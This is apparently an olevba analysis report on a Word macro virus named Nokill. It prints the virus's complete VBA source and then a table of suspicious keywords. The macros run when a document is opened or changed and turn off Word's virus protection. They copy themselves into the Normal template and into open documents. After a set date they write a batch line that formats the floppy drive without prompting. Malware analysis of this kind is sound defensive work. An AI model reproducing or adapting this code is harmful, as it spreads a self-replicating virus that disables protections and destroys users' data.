olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Nokill
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Nokill - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Xl.cls 
in file: Virus.MSWord.Nokill - OLE stream: 'Macros/VBA/Xl'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Public WithEvents App As Word.Application

Private Sub App_DocumentChange()
Sae
End Sub


-------------------------------------------------------------------------------
VBA MACRO Xl1.cls 
in file: Virus.MSWord.Nokill - OLE stream: 'Macros/VBA/Xl1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Public WithEvents App As Word.Application

Private Sub App_DocumentChange()
Sae
End Sub


-------------------------------------------------------------------------------
VBA MACRO CloseA.bas 
in file: Virus.MSWord.Nokill - OLE stream: 'Macros/VBA/CloseA'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Dim X As New Xl
Sub AutoExec()
Set X.App = Word.Application
Options.VirusProtection = False
Sae
End Sub
Sub AutoOpen()
Set X.App = Word.Application
Options.VirusProtection = False
Sae
End Sub
Function man()

Options.VirusProtection = False
If Documents.Count = 0 Then Exit Function

nn = NormalTemplate.VBProject.VBComponents.Count
F1 = True
F2 = True
For k1 = 2 To nn
    If NormalTemplate.VBProject.VBComponents.Item(k1).Name = "CloseA" Then
        F1 = False
    End If
Next
nn = ActiveDocument.VBProject.VBComponents.Count
For k1 = 2 To nn
    If ActiveDocument.VBProject.VBComponents.Item(k1).Name = "CloseA" Then
        F2 = False
    End If
Next

If Documents.Count > 0 And (F1 Or F2) Then
    n1 = Application.VBE.VBProjects.Item(1).VBComponents.Count
    For k1 = 2 To n1
        Application.VBE.VBProjects.Item(1).VBComponents.Item(k1).Export ("c:\test-" + Trim(Str(k)) + "-" + Trim(Str(k1)) + ".bas")
    Next
    
    tt = Dir("c:\test*.bas")
    Do While tt <> ""
        If F2 Then ActiveDocument.VBProject.VBComponents.Import ("c:\" + tt)
        If F1 Then NormalTemplate.VBProject.VBComponents.Import ("c:\" + tt)
        Kill ("c:\" + tt)
        tt = Dir()
    Loop
End If
End Function

Function Sae()
Attribute Sae.VB_Description = "Ìàêðîñ ñîçäàí 03.05.00 1"
Attribute Sae.VB_ProcData.VB_Invoke_Func = "Normal.NewMacros.ééééééééééé"
Dim dat As Date
dat = "17.04.00"
If Date < dat Then
    Exit Function
End If
If Dir("c:\nokill.pls") = "nokill.pls" Then
    Exit Function
End If

Open "c:\start" For Output As #1
Print #1, "Y"
Print #1, ""
Close #1

Open "c:\autoexec" For Output As #1
Print #1, "@smartdrv.exe"
Print #1, "@format a: /q <start"
Close #1
man
End Function
-------------------------------------------------------------------------------
VBA MACRO Xl2.cls 
in file: Virus.MSWord.Nokill - OLE stream: 'Macros/VBA/Xl2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Public WithEvents App As Word.Application

Private Sub App_DocumentChange()
Sae
End Sub


+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |Application.VBE     |Executable file name                         |
|IOC       |smartdrv.exe        |Executable file name                         |
+----------+--------------------+---------------------------------------------+

